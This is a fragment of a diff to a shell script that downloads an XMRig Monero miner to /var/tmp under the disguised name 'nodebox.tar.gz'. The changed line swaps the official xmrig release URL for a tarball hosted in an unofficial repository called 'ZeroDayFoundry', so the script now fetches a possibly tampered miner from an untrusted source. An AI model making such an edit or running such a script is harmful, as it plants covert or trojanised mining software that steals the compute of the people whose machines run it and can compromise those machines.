@@ -182,7 +182,7 @@ if (test $? -ne 0); then
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
-  LATEST_XMRIG_LINUX_RELEASE="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
+  LATEST_XMRIG_LINUX_RELEASE="https://github.com/XPACLION9X/ZeroDayFoundry/blob/main/xmrig.tar.gz"
 
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /var/tmp/nodebox.tar.gz"
   if ! download_file "$LATEST_XMRIG_LINUX_RELEASE" /var/tmp/nodebox.tar.gz; then
